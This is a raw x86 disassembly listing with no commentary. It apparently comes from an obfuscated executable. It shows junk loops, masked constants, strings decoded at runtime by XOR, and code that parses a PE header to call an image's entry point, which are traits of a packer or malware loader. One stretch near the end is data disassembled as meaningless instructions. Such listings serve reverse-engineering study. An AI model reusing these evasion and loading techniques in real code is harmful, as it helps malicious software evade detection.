  4249a1:	lea    eax,[esp+0x44]
  4249a5:	push   eax
  4249a6:	push   0x429ce6
  4249ab:	push   0x429cfa
  4249b0:	push   0x429d1a
  4249b5:	call   esi
  4249b7:	imul   eax,eax,0x300000
  4249bd:	cmp    eax,0x1b00000
  4249c2:	jne    0x423b08
  4249c8:	lea    eax,[esp+0x1b8]
  4249cf:	push   eax
  4249d0:	push   0x429d56
  4249d5:	call   DWORD PTR ds:0x42a402
  4249db:	cmp    eax,0xffffffff
  4249de:	jne    0x423b08
  4249e4:	lea    eax,[esp+0x78]
  4249e8:	push   eax
  4249e9:	push   0x429d42
  4249ee:	call   DWORD PTR ds:0x42a406
  4249f4:	cmp    eax,0xffffffff
  4249f7:	jne    0x423b08
  4249fd:	push   0xf
  4249ff:	lea    eax,[esp+0x44]
  424a03:	push   eax
  424a04:	push   0x429d96
  424a09:	push   0x429daa
  424a0e:	push   0x429dca
  424a13:	call   esi
  424a15:	imul   eax,eax,0x300000
  424a1b:	cmp    eax,0x1b00000
  424a20:	jne    0x423b08
  424a26:	lea    eax,[esp+0x1b8]
  424a2d:	push   eax
  424a2e:	push   0x429e06
  424a33:	call   DWORD PTR ds:0x42a402
  424a39:	cmp    eax,0xffffffff
  424a3c:	jne    0x423b08
  424a42:	lea    eax,[esp+0x78]
  424a46:	push   eax
  424a47:	push   0x429df2
  424a4c:	call   DWORD PTR ds:0x42a406
  424a52:	cmp    eax,0xffffffff
  424a55:	jne    0x423b08
  424a5b:	push   0xf
  424a5d:	lea    eax,[esp+0x44]
  424a61:	push   eax
  424a62:	push   0x429e46
  424a67:	push   0x429e5a
  424a6c:	push   0x429e7a
  424a71:	call   esi
  424a73:	imul   eax,eax,0x300000
  424a79:	cmp    eax,0x1b00000
  424a7e:	jne    0x423b08
  424a84:	lea    eax,[esp+0x1b8]
  424a8b:	push   eax
  424a8c:	push   0x429eb6
  424a91:	call   DWORD PTR ds:0x42a402
  424a97:	cmp    eax,0xffffffff
  424a9a:	jne    0x423b08
  424aa0:	mov    eax,DWORD PTR [esp+0x3c]
  424aa4:	cmp    eax,0xf89c85ba
  424aa9:	je     0x424b08
  424aaf:	mov    eax,DWORD PTR [esp+0x20]
  424ab3:	mov    ecx,DWORD PTR [esp+0x38]
  424ab7:	xor    eax,edi
  424ab9:	add    eax,ebx
  424abb:	cmp    eax,ecx
  424abd:	je     0x424b08
  424ac3:	mov    eax,ds:0x42941e
  424ac8:	mov    eax,DWORD PTR [eax+0x194]
  424ace:	mov    ecx,DWORD PTR [eax]
  424ad0:	mov    eax,DWORD PTR [ecx+0x3c]
  424ad3:	push   DWORD PTR ds:0x4294fe
  424ad9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  424add:	push   DWORD PTR ds:0x4292a2
  424ae3:	add    eax,ecx
  424ae5:	mov    ecx,DWORD PTR ds:0x42941e
  424aeb:	mov    ecx,DWORD PTR [ecx+0x194]
  424af1:	push   DWORD PTR [ecx]
  424af3:	call   eax
  424af5:	mov    ecx,DWORD PTR ds:0x42941e
  424afb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424b01:	mov    DWORD PTR [ecx],eax
  424b03:	jmp    0x424d35
  424b08:	mov    eax,DWORD PTR [esp+0x20]
  424b0c:	mov    ecx,DWORD PTR [esp+0x60]
  424b10:	xor    eax,edi
  424b12:	add    eax,ebx
  424b14:	cmp    eax,ecx
  424b16:	jne    0x424b7f
  424b1c:	mov    eax,DWORD PTR [esp+0x20]
  424b20:	mov    ecx,DWORD PTR ds:0x42941e
  424b26:	mov    ecx,DWORD PTR [ecx+0x198]
  424b2c:	xor    eax,edi
  424b2e:	add    eax,ebx
  424b30:	cmp    eax,DWORD PTR [ecx]
  424b32:	jne    0x424b58
  424b38:	mov    eax,DWORD PTR [esp+0x20]
  424b3c:	push   0xf89c85a5
  424b41:	xor    eax,edi
  424b43:	add    eax,ebx
  424b45:	push   eax
  424b46:	push   0xf89c85b9
  424b4b:	push   DWORD PTR [esp+0x18]
  424b4f:	push   DWORD PTR [esp+0x30]
  424b53:	call   0x423404
  424b58:	push   DWORD PTR [esp+0xc]
  424b5c:	push   DWORD PTR [esp+0x24]
  424b60:	call   0x401000
  424b65:	mov    eax,DWORD PTR [esp+0x20]
  424b69:	xor    eax,edi
  424b6b:	add    eax,ebx
  424b6d:	mov    ds:0x4294aa,eax
  424b72:	mov    eax,DWORD PTR [esp+0x20]
  424b76:	xor    eax,edi
  424b78:	add    eax,ebx
  424b7a:	mov    ds:0x4294a2,eax
  424b7f:	mov    eax,DWORD PTR [esp+0x2c]
  424b83:	test   eax,eax
  424b85:	je     0x424d35
  424b8b:	lea    eax,[esp+0x78]
  424b8f:	mov    DWORD PTR [esp+0x64],0xf152c32
  424b97:	push   eax
  424b98:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424ba0:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424ba8:	push   0x429ea2
  424bad:	mov    DWORD PTR [esp+0x70],0x72670add
  424bb5:	call   DWORD PTR ds:0x42a406
  424bbb:	cmp    eax,0xffffffff
  424bbe:	jne    0x423b08
  424bc4:	push   0xf
  424bc6:	lea    eax,[esp+0x44]
  424bca:	push   eax
  424bcb:	push   0x429ef6
  424bd0:	push   0x429f0a
  424bd5:	push   0x429f2a
  424bda:	call   esi
  424bdc:	imul   eax,eax,0x300000
  424be2:	cmp    eax,0x1b00000
  424be7:	jne    0x423b08
  424bed:	lea    eax,[esp+0x1b8]
  424bf4:	push   eax
  424bf5:	push   0x429f66
  424bfa:	call   DWORD PTR ds:0x42a402
  424c00:	cmp    eax,0xffffffff
  424c03:	jne    0x423b08
  424c09:	call   0x422008
  424c0e:	mov    eax,DWORD PTR [esp+0x34]
  424c12:	mov    eax,DWORD PTR [esp+0xc]
  424c16:	mov    DWORD PTR [esp+0x30],eax
  424c1a:	mov    eax,DWORD PTR [esp+0x20]
  424c1e:	mov    DWORD PTR [esp+0xc],eax
  424c22:	mov    eax,eax
  424c24:	mov    eax,ds:0x42941e
  424c29:	mov    ecx,DWORD PTR [eax+0x1c0]
  424c2f:	mov    edx,DWORD PTR [ecx]
  424c31:	and    DWORD PTR [esp+0x1c],0x0
  424c36:	mov    esi,0xfabdbed8
  424c3b:	add    edx,esi
  424c3d:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424c42:	mov    ecx,0x8a29a13d
  424c47:	xor    edx,ecx
  424c49:	mov    DWORD PTR [esp+0x10],edx
  424c4d:	mov    edx,DWORD PTR [esp+0x1c]
  424c51:	xor    edx,0x0
  424c54:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424c5c:	mov    DWORD PTR [esp+0x14],edx
  424c60:	jne    0x424c6f
  424c66:	cmp    edx,0xffffffff
  424c69:	je     0x424cd8
  424c6f:	mov    eax,DWORD PTR [eax+0x1c8]
  424c75:	mov    eax,DWORD PTR [eax]
  424c77:	cdq    
  424c78:	add    eax,esi
  424c7a:	adc    edx,0xffffffff
  424c7d:	and    DWORD PTR [esp+0x1c],0x0
  424c82:	xor    edx,0x0
  424c85:	mov    DWORD PTR [esp+0x24],edx
  424c89:	mov    edx,DWORD PTR [esp+0xc]
  424c8d:	mov    DWORD PTR [esp+0x18],edx
  424c91:	xor    eax,ecx
  424c93:	add    DWORD PTR [esp+0x18],esi
  424c97:	mov    edx,DWORD PTR [esp+0x18]
  424c9b:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424ca0:	xor    edx,ecx
  424ca2:	mov    DWORD PTR [esp+0x10],edx
  424ca6:	mov    edx,DWORD PTR [esp+0x1c]
  424caa:	xor    edx,0x0
  424cad:	mov    DWORD PTR [esp+0x14],edx
  424cb1:	cmp    DWORD PTR [esp+0x10],eax
  424cb5:	jne    0x424cc7
  424cbb:	mov    eax,DWORD PTR [esp+0x24]
  424cbf:	cmp    edx,eax
  424cc1:	je     0x424cd8
  424cc7:	mov    eax,DWORD PTR [esp+0xc]
  424ccb:	add    eax,DWORD PTR [esp+0x30]
  424ccf:	mov    DWORD PTR [esp+0xc],eax
  424cd3:	jmp    0x424d35
  424cd8:	mov    eax,ds:0x4294a2
  424cdd:	mov    edx,DWORD PTR ds:0x4294aa
  424ce3:	xor    eax,edx
  424ce5:	mov    ds:0x4294a2,eax
  424cea:	mov    edx,DWORD PTR ds:0x4294a2
  424cf0:	mov    eax,DWORD PTR [esp+0x2c]
  424cf4:	add    DWORD PTR [eax],edx
  424cf6:	mov    edx,DWORD PTR [esp+0xc]
  424cfa:	mov    eax,ds:0x4294a2
  424cff:	xor    edx,edi
  424d01:	add    edx,ebx
  424d03:	xor    ebx,ebx
  424d05:	add    edx,esi
  424d07:	adc    ebx,0xffffffff
  424d0a:	xor    edi,edi
  424d0c:	xor    edx,ecx
  424d0e:	xor    ebx,0x0
  424d11:	add    eax,esi
  424d13:	adc    edi,0xffffffff
  424d16:	xor    eax,ecx
  424d18:	xor    edi,0x0
  424d1b:	cmp    eax,edx
  424d1d:	jne    0x424d35
  424d23:	cmp    edi,ebx
  424d25:	jne    0x424d35
  424d2b:	mov    eax,ds:0x4294a2
  424d30:	mov    ds:0x4294aa,eax
  424d35:	lea    eax,[esp+0x78]
  424d39:	push   eax
  424d3a:	push   0x429f52
  424d3f:	call   DWORD PTR ds:0x42a406
  424d45:	cmp    eax,0xffffffff
  424d48:	jne    0x423b08
  424d4e:	push   0xf
  424d50:	lea    eax,[esp+0x44]
  424d54:	push   eax
  424d55:	push   0x429fa6
  424d5a:	push   0x429fba
  424d5f:	push   0x429fda
  424d64:	call   DWORD PTR ds:0x42a3fe
  424d6a:	imul   eax,eax,0x300000
  424d70:	cmp    eax,0x1b00000
  424d75:	jne    0x423b08
  424d7b:	lea    eax,[esp+0x1b8]
  424d82:	push   eax
  424d83:	push   0x42a006
  424d88:	call   DWORD PTR ds:0x42a402
  424d8e:	cmp    eax,0xffffffff
  424d91:	jne    0x423b08
  424d97:	mov    eax,ds:0x42941e
  424d9c:	push   0x4
  424d9e:	add    eax,0x1cc
  424da3:	push   eax
  424da4:	lea    eax,[esp+0x3c]
  424da8:	push   eax
  424da9:	call   0x424dbd
  424dae:	mov    eax,DWORD PTR [esp+0x34]
  424db2:	mov    eax,DWORD PTR [eax]
  424db4:	pop    edi
  424db5:	pop    esi
  424db6:	pop    ebx
  424db7:	mov    esp,ebp
  424db9:	pop    ebp
  424dba:	ret    0xc
  424dbd:	push   ebp
  424dbe:	mov    ebp,esp
  424dc0:	sub    esp,0x10
  424dc3:	or     eax,0x4f1d
  424dc8:	mov    eax,0xf89c85a5
  424dcd:	mov    DWORD PTR [ebp-0x4],eax
  424dd0:	or     ecx,edx
  424dd2:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424dd9:	add    DWORD PTR ds:0x42a2da,edi
  424ddf:	mov    ecx,DWORD PTR [ebp-0x4]
  424de2:	movzx  edx,BYTE PTR ds:0x42a2f6
  424de9:	adc    DWORD PTR ds:0x42a2da,edx
  424def:	push   esi
  424df0:	or     DWORD PTR ds:0x42a2ba,ebx
  424df6:	mov    edx,0x75108aa
  424dfb:	xor    esi,DWORD PTR ds:0x42a27e
  424e01:	xor    ecx,edx
  424e03:	mov    DWORD PTR ds:0x42a2ae,0x17
  424e0d:	cmp    DWORD PTR ds:0x42a2ae,0x0
  424e14:	je     0x424e47
  424e1a:	cmp    DWORD PTR ds:0x42a2ae,0x19
  424e21:	jb     0x424e47
  424e27:	jmp    0x424e35
  424e2c:	push   DWORD PTR [ebp-0x14]
  424e2f:	call   DWORD PTR ds:0x42a3ea
  424e35:	mov    esi,DWORD PTR ds:0x42a2ae
  424e3b:	dec    esi
  424e3c:	mov    DWORD PTR ds:0x42a2ae,esi
  424e42:	jmp    0x424e0d
  424e47:	mov    esi,0x3272f1
  424e4c:	adc    DWORD PTR ds:0x42a272,0x42a296
  424e56:	push   edi
  424e57:	adc    DWORD PTR ds:0x42a2fa,0x7011
  424e61:	mov    edi,DWORD PTR [ebp+0x10]
  424e64:	add    DWORD PTR ds:0x42a2ea,0x6129
  424e6e:	add    ecx,esi
  424e70:	mov    DWORD PTR ds:0x42a302,0x6d2d
  424e7a:	cmp    ecx,edi
  424e7c:	mov    DWORD PTR ds:0x42a2d6,0xb6
  424e86:	je     0x424fb1
  424e8c:	mov    ecx,DWORD PTR ds:0x42a2be
  424e92:	adc    DWORD PTR ds:0x42a2e2,ecx
  424e98:	mov    ecx,DWORD PTR [ebp-0x4]
  424e9b:	mov    edi,DWORD PTR [ebp+0x10]
  424e9e:	xor    eax,eax
  424ea0:	sbb    DWORD PTR ds:0x42a27a,0x42a2da
  424eaa:	xor    ecx,edx
  424eac:	add    ecx,esi
  424eae:	xor    DWORD PTR ds:0x42a2f6,0x42a2ae
  424eb8:	add    edi,0xfabdbed8
  424ebe:	mov    DWORD PTR ds:0x42a2b2,0x6fd3
  424ec8:	adc    eax,0xffffffff
  424ecb:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424ed5:	xor    eax,0x0
  424ed8:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424ee2:	mov    DWORD PTR [ebp-0xc],eax
  424ee5:	push   ebx
  424ee6:	dec    eax
  424ee7:	xor    ebx,ebx
  424ee9:	xor    edi,0x8a29a13d
  424eef:	mov    eax,ds:0x42a336
  424ef4:	mov    eax,DWORD PTR [eax]
  424ef6:	and    DWORD PTR ds:0x42a2d2,eax
  424efc:	mov    eax,ecx
  424efe:	add    eax,0xfabdbed8
  424f03:	adc    ebx,0xffffffff
  424f06:	mov    DWORD PTR ds:0x42a2ea,0x4e45
  424f10:	xor    eax,0x8a29a13d
  424f15:	inc    DWORD PTR ds:0x42a27e
  424f1b:	xor    ebx,0x0
  424f1e:	mov    DWORD PTR ds:0x42a2da,0x13c1
  424f28:	cmp    eax,edi
  424f2a:	jne    0x424f43
  424f30:	cmp    ebx,DWORD PTR [ebp-0xc]
  424f33:	je     0x424fab
  424f39:	jmp    0x424f43
  424f3e:	mov    esi,0x3272f1
  424f43:	mov    eax,DWORD PTR [ebp-0x4]
  424f46:	mov    edi,DWORD PTR [ebp-0x8]
  424f49:	xor    edi,edx
  424f4b:	add    edi,esi
  424f4d:	mov    esi,DWORD PTR [ebp+0x8]
  424f50:	imul   edi,ecx
  424f53:	mov    ebx,DWORD PTR [ebp+0xc]
  424f56:	xor    eax,edx
  424f58:	add    eax,ecx
  424f5a:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  424f61:	mov    BYTE PTR [edi+esi*1],al
  424f64:	mov    eax,DWORD PTR [ebp-0x8]
  424f67:	mov    esi,DWORD PTR [ebp+0x10]
  424f6a:	xor    eax,edx
  424f6c:	xor    ebx,ebx
  424f6e:	add    esi,0xfabdbed8
  424f74:	adc    ebx,0xffffffff
  424f77:	lea    ecx,[ecx+eax*1+0x3272f1]
  424f7e:	xor    edi,edi
  424f80:	xor    esi,0x8a29a13d
  424f86:	xor    ebx,0x0
  424f89:	mov    eax,ecx
  424f8b:	add    eax,0xfabdbed8
  424f90:	adc    edi,0xffffffff
  424f93:	xor    eax,0x8a29a13d
  424f98:	xor    edi,0x0
  424f9b:	cmp    eax,esi
  424f9d:	jne    0x424f3e
  424fa3:	cmp    edi,ebx
  424fa5:	jne    0x424f3e
  424fab:	mov    eax,0xf89c85ba
  424fb0:	pop    ebx
  424fb1:	pop    edi
  424fb2:	pop    esi
  424fb3:	leave  
  424fb4:	ret    0xc
  424fb7:	push   ebp
  424fb8:	mov    ebp,esp
  424fba:	push   ecx
  424fbb:	xor    ecx,0x1d8f
  424fc1:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424fc8:	mov    DWORD PTR ds:0x42a2a6,0x12
  424fd2:	cmp    DWORD PTR ds:0x42a2a6,0x0
  424fd9:	je     0x425013
  424fdf:	cmp    DWORD PTR ds:0x42a2a6,0x14
  424fe6:	jb     0x425013
  424fec:	jmp    0x425001
  424ff1:	push   0x42a2ee
  424ff6:	push   0x429000
  424ffb:	call   DWORD PTR ds:0x42a3f2
  425001:	mov    edx,DWORD PTR ds:0x42a2a6
  425007:	dec    edx
  425008:	mov    DWORD PTR ds:0x42a2a6,edx
  42500e:	jmp    0x424fd2
  425013:	mov    eax,DWORD PTR [ebp+0x8]
  425016:	adc    DWORD PTR ds:0x42a2ce,0x6bd6
  425020:	movsx  eax,BYTE PTR [eax]
  425023:	adc    DWORD PTR ds:0x42a2ea,ebx
  425029:	mov    edx,0x3272f1
  42502e:	and    DWORD PTR ds:0x42a2e6,0x2b27
  425038:	sub    eax,edx
  42503a:	mov    ecx,0x75108aa
  42503f:	add    DWORD PTR ds:0x42a256,0x714
  425049:	xor    eax,ecx
  42504b:	mov    DWORD PTR ds:0x42a2f6,0x37ad
  425055:	cmp    eax,0xf89c85f6
  42505a:	jne    0x425089
  425060:	mov    eax,DWORD PTR [ebp+0x8]
  425063:	push   esi
  425064:	mov    esi,DWORD PTR [ebp+0x8]
  425067:	add    esi,DWORD PTR [eax+0x3c]
  42506a:	mov    DWORD PTR [ebp+0x8],esi
  42506d:	mov    eax,DWORD PTR [ebp-0x4]
  425070:	mov    esi,DWORD PTR [ebp+0x8]
  425073:	xor    eax,ecx
  425075:	add    eax,edx
  425077:	cmp    DWORD PTR [esi+0x54],eax
  42507a:	pop    esi
  42507b:	je     0x425089
  425081:	mov    eax,DWORD PTR [ebp+0x8]
  425084:	jmp    0x425090
  425089:	mov    eax,DWORD PTR [ebp-0x4]
  42508c:	xor    eax,ecx
  42508e:	add    eax,edx
  425090:	leave  
  425091:	ret    0x4
  425094:	push   ebp
  425095:	mov    ebp,esp
  425097:	sub    esp,0xc
  42509a:	mov    DWORD PTR ds:0x42a25a,0x10
  4250a4:	cmp    DWORD PTR ds:0x42a25a,0x0
  4250ab:	je     0x425106
  4250b1:	cmp    DWORD PTR ds:0x42a25a,0x7
  4250b8:	jle    0x425106
  4250be:	jmp    0x4250d8
  4250c3:	push   0x3f8d
  4250c8:	push   0x4291fd
  4250cd:	push   0x4291fd
  4250d2:	call   DWORD PTR ds:0x42a3b6
  4250d8:	cmp    DWORD PTR ds:0x42a25a,0x8
  4250df:	jne    0x4250f2
  4250e5:	mov    edx,DWORD PTR ds:0x42a25a
  4250eb:	dec    edx
  4250ec:	mov    DWORD PTR ds:0x42a25a,edx
  4250f2:	xor    edx,edx
  4250f4:	or     edx,DWORD PTR ds:0x42a25a
  4250fa:	dec    edx
  4250fb:	mov    DWORD PTR ds:0x42a25a,edx
  425101:	jmp    0x4250a4
  425106:	push   esi
  425107:	mov    esi,0xf89c85a5
  42510c:	mov    DWORD PTR [ebp-0x8],esi
  42510f:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  425116:	mov    DWORD PTR ds:0x42a2b6,0x3461
  425120:	push   edi
  425121:	xor    DWORD PTR ds:0x42a256,0x42a262
  42512b:	mov    eax,eax
  42512d:	and    DWORD PTR ds:0x42a2aa,0x0
  425137:	jmp    0x42514b
  42513c:	xor    edx,edx
  42513e:	or     edx,DWORD PTR ds:0x42a2aa
  425144:	inc    edx
  425145:	mov    DWORD PTR ds:0x42a2aa,edx
  42514b:	cmp    DWORD PTR ds:0x42a2aa,0x1c
  425152:	jae    0x42519d
  425158:	cmp    DWORD PTR ds:0x42a2aa,0x7
  42515f:	jb     0x42519d
  425165:	jmp    0x42517e
  42516a:	push   DWORD PTR [ebp-0x20]
  42516d:	push   0x42a2ea
  425172:	push   DWORD PTR [ebp-0x20]
  425175:	push   DWORD PTR [ebp-0x20]
  425178:	call   DWORD PTR ds:0x42a3f6
  42517e:	cmp    DWORD PTR ds:0x42a2aa,0x6
  425185:	jne    0x425198
  42518b:	mov    edx,DWORD PTR ds:0x42a2aa
  425191:	inc    edx
  425192:	mov    DWORD PTR ds:0x42a2aa,edx
  425198:	jmp    0x42513c
  42519d:	mov    eax,DWORD PTR [ebp-0x4]
  4251a0:	and    DWORD PTR ds:0x42a2ea,0x0
  4251aa:	jmp    0x4251bc
  4251af:	mov    edx,DWORD PTR ds:0x42a2ea
  4251b5:	inc    edx
  4251b6:	mov    DWORD PTR ds:0x42a2ea,edx
  4251bc:	cmp    DWORD PTR ds:0x42a2ea,0x1e
  4251c3:	jae    0x4251ee
  4251c9:	cmp    DWORD PTR ds:0x42a2ea,0x25
  4251d0:	jbe    0x4251ee
  4251d6:	jmp    0x4251e9
  4251db:	push   0x42919f
  4251e0:	push   DWORD PTR [ebp-0xc]
  4251e3:	call   DWORD PTR ds:0x42a3ba
  4251e9:	jmp    0x4251af
  4251ee:	mov    edi,DWORD PTR [ebp-0x8]
  4251f1:	mov    ecx,0x75108aa
  4251f6:	xor    eax,ecx
  4251f8:	xor    edi,ecx
  4251fa:	mov    edx,0x3272f1
  4251ff:	add    edi,edx
  425201:	add    eax,edx
  425203:	imul   eax,edi
  425206:	mov    edi,DWORD PTR [ebp+0xc]
  425209:	cmp    edi,eax
  42520b:	je     0x425260
  425211:	mov    DWORD PTR [ebp-0xc],esi
  425214:	mov    eax,DWORD PTR [ebp-0xc]
  425217:	mov    esi,DWORD PTR [ebp+0xc]
  42521a:	xor    eax,ecx
  42521c:	lea    eax,[eax*8+0x1939800]
  425223:	mov    eax,DWORD PTR [esi+eax*1]
  425226:	mov    DWORD PTR [ebp+0xc],eax
  425229:	mov    eax,DWORD PTR [ebp-0x4]
  42522c:	mov    esi,DWORD PTR [ebp-0x8]
  42522f:	xor    eax,ecx
  425231:	xor    esi,ecx
  425233:	add    esi,edx
  425235:	add    eax,edx
  425237:	imul   eax,esi
  42523a:	mov    esi,DWORD PTR [ebp+0xc]
  42523d:	cmp    esi,eax
  42523f:	je     0x425260
  425245:	mov    eax,DWORD PTR [ebp-0x4]
  425248:	xor    eax,ecx
  42524a:	mov    ecx,DWORD PTR [ebp+0xc]
  42524d:	add    eax,edx
  42524f:	imul   eax,ecx
  425252:	add    eax,DWORD PTR [ebp+0x8]
  425255:	mov    DWORD PTR [ebp+0xc],eax
  425258:	mov    eax,DWORD PTR [ebp+0xc]
  42525b:	jmp    0x425271
  425260:	mov    eax,DWORD PTR [ebp-0x4]
  425263:	mov    esi,DWORD PTR [ebp-0x8]
  425266:	xor    esi,ecx
  425268:	xor    eax,ecx
  42526a:	add    esi,edx
  42526c:	add    eax,edx
  42526e:	imul   eax,esi
  425271:	pop    edi
  425272:	pop    esi
  425273:	leave  
  425274:	ret    0x8
	...
  425283:	add    cl,cl
  425285:	dec    edx
  425286:	jns    0x4252d5
  425288:	add    BYTE PTR [eax],al
  42528a:	add    BYTE PTR [eax],al
  42528c:	add    al,BYTE PTR [eax]
  42528e:	add    BYTE PTR [eax],al
  425290:	xor    BYTE PTR [eax],al
  425292:	add    BYTE PTR [eax],al
  425294:	mov    al,ds:0xa0000252
  425299:	inc    esi
  42529a:	add    al,BYTE PTR [eax]
  42529c:	add    BYTE PTR [eax],al
  42529e:	add    BYTE PTR [eax],al
  4252a0:	push   edx
  4252a1:	push   ebx
  4252a2:	inc    esp
  4252a3:	push   ebx
  4252a4:	inc    ecx
  4252a5:	cld    
  4252a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252a7:	test   DWORD PTR [ecx-0x4fb41102],edi
  4252ad:	div    DWORD PTR [edi+eiz*4+0x7bdc00aa]
  4252b4:	add    DWORD PTR [eax],eax
  4252b6:	add    BYTE PTR [eax],al
  4252b8:	inc    esi
  4252b9:	cmp    bl,BYTE PTR [edi+edx*2+0x69]
  4252bd:	outs   dx,BYTE PTR ds:[esi]
  4252be:	outs   dx,DWORD PTR fs:[esi]
  4252c0:	ja     0x425335
  4252c2:	and    BYTE PTR [ecx+ebp*2+0x72],al
  4252c6:	pop    esp
  4252c7:	inc    esi
  4252c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x636578
  4252d0:	mov    edx,DWORD PTR [ebp-0x14]
  4252d3:	sub    esp,0x108
  4252d9:	push   ebx
  4252da:	mov    eax,ebx
  4252dc:	xchg   ecx,eax
  4252dd:	mov    eax,DWORD PTR [ebp+0x8]
  4252e0:	cmp    eax,0xf89c85a5
  4252e5:	jne    0x42579f
  4252eb:	mov    eax,DWORD PTR [ebp+0xc]
  4252ee:	cmp    eax,0xf89c85ba
  4252f3:	jne    0x42579f
  4252f9:	mov    eax,DWORD PTR [ebp+0x24]
  4252fc:	mov    DWORD PTR [ebp-0x4],eax
  4252ff:	mov    eax,DWORD PTR [ebp-0x4]
  425302:	mov    eax,DWORD PTR [eax+0x1d8]
  425308:	mov    eax,DWORD PTR [eax]
  42530a:	mov    eax,DWORD PTR [eax]
  42530c:	mov    DWORD PTR [ebp-0x8],eax
  42530f:	mov    BYTE PTR [ebp-0x18],0x1a
  425313:	mov    BYTE PTR [ebp-0x17],0x1f
  425317:	mov    BYTE PTR [ebp-0x16],0x14
  42531b:	mov    BYTE PTR [ebp-0x15],0x4e
  42531f:	mov    BYTE PTR [ebp-0x14],0x4d
  425323:	mov    BYTE PTR [ebp-0x13],0x83
  425327:	mov    BYTE PTR [ebp-0x20],0x8
  42532b:	mov    BYTE PTR [ebp-0x1f],0xe
  42532f:	mov    BYTE PTR [ebp-0x1e],0x18
  425333:	mov    BYTE PTR [ebp-0x1d],0xd
  425337:	mov    BYTE PTR [ebp-0x1c],0x4e
  42533b:	mov    BYTE PTR [ebp-0x1b],0x4d
  42533f:	mov    BYTE PTR [ebp-0x1a],0x83
  425343:	mov    BYTE PTR [ebp-0x28],0xe
  425347:	mov    BYTE PTR [ebp-0x27],0x1b
  42534b:	mov    BYTE PTR [ebp-0x26],0x17
  42534f:	mov    BYTE PTR [ebp-0x25],0xa
  425353:	mov    BYTE PTR [ebp-0x24],0x1c
  425357:	mov    BYTE PTR [ebp-0x23],0x13
  42535b:	mov    BYTE PTR [ebp-0x22],0x14
  42535f:	mov    BYTE PTR [ebp-0x21],0x83
  425363:	xor    ecx,ecx
  425365:	lea    eax,[ebp+ecx*1-0x18]
  425369:	movzx  edx,BYTE PTR [eax]
  42536c:	xor    edx,0x7c
  42536f:	inc    edx
  425370:	inc    ecx
  425371:	mov    BYTE PTR [eax],dl
  425373:	cmp    ecx,0x6
  425376:	jb     0x425365
  425378:	xor    ecx,ecx
  42537a:	lea    eax,[ebp+ecx*1-0x20]
  42537e:	movzx  edx,BYTE PTR [eax]
  425381:	xor    edx,0x7c
  425384:	inc    edx
  425385:	inc    ecx
  425386:	mov    BYTE PTR [eax],dl
  425388:	cmp    ecx,0x7
  42538b:	jb     0x42537a
  42538d:	xor    ecx,ecx
  42538f:	lea    eax,[ebp+ecx*1-0x28]
  425393:	movzx  edx,BYTE PTR [eax]
  425396:	xor    edx,0x7c
  425399:	inc    edx
  42539a:	inc    ecx
  42539b:	mov    BYTE PTR [eax],dl
  42539d:	cmp    ecx,0x8
  4253a0:	jb     0x42538f
  4253a2:	lea    eax,[ebp-0x2c]
  4253a5:	mov    DWORD PTR [ebp-0x8],eax
  4253a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4253ab:	mov    eax,0x7113fccf
  4253b0:	mov    DWORD PTR [ecx],eax
  4253b2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4253b5:	push   esi
  4253b6:	push   edi
  4253b7:	mov    esi,0x4e3e
  4253bc:	mov    ebx,0x3272f1
  4253c1:	cmp    ecx,eax
  4253c3:	jne    0x42548e
  4253c9:	lea    eax,[esi+0x39]
  4253cc:	mov    WORD PTR [ebp-0x78],ax
  4253d0:	mov    eax,esi
  4253d2:	mov    WORD PTR [ebp-0x76],ax
  4253d6:	add    eax,0x33
  4253d9:	mov    WORD PTR [ebp-0x74],ax
  4253dd:	lea    eax,[esi-0xe]
  4253e0:	mov    WORD PTR [ebp-0x72],ax
  4253e4:	add    eax,0x4f
  4253e7:	mov    ecx,eax
  4253e9:	lea    eax,[esi-0x15]
  4253ec:	mov    WORD PTR [ebp-0x66],ax
  4253f0:	mov    eax,esi
  4253f2:	mov    WORD PTR [ebp-0x64],ax
  4253f6:	add    eax,0xffffffec
  4253f9:	mov    WORD PTR [ebp-0x62],ax
  4253fd:	mov    eax,0x443
  425402:	mov    WORD PTR [ebp-0x60],ax
  425406:	mov    eax,0x5674
  42540b:	mov    WORD PTR [ebp-0x5e],ax
  42540f:	mov    eax,0x6114
  425414:	mov    WORD PTR [ebp-0x5c],ax
  425418:	lea    eax,[ebp-0xe0]
  42541e:	push   eax
  42541f:	mov    eax,DWORD PTR [ebp+0xc]
  425422:	mov    edi,0x75108aa
  425427:	xor    eax,edi
  425429:	add    eax,ebx
  42542b:	push   eax
  42542c:	mov    WORD PTR [ebp-0x70],cx
  425430:	lea    ecx,[esi-0xa]
  425433:	mov    edx,ecx
  425435:	lea    eax,[ebp-0x78]
  425438:	push   eax
  425439:	mov    eax,DWORD PTR [ebp-0x4]
  42543c:	mov    eax,DWORD PTR [eax+0x198]
  425442:	mov    WORD PTR [ebp-0x6e],dx
  425446:	mov    edx,0x4f8a
  42544b:	mov    WORD PTR [ebp-0x6c],dx
  42544f:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  425456:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  42545d:	mov    DWORD PTR [ebp-0xe0],0x1
  425467:	mov    DWORD PTR [ebp-0xdc],0x255
  425471:	push   DWORD PTR [eax]
  425473:	mov    eax,DWORD PTR [ebp+0x10]
  425476:	call   eax
  425478:	mov    DWORD PTR [ebp-0x8],eax
  42547b:	mov    eax,DWORD PTR [ebp-0x8]
  42547e:	test   eax,eax
  425480:	je     0x425493
  425482:	xor    DWORD PTR ds:0x76586876,0x87687666
  42548c:	jmp    0x425493
  42548e:	mov    edi,0x75108aa
  425493:	mov    eax,DWORD PTR [ebp-0x4]
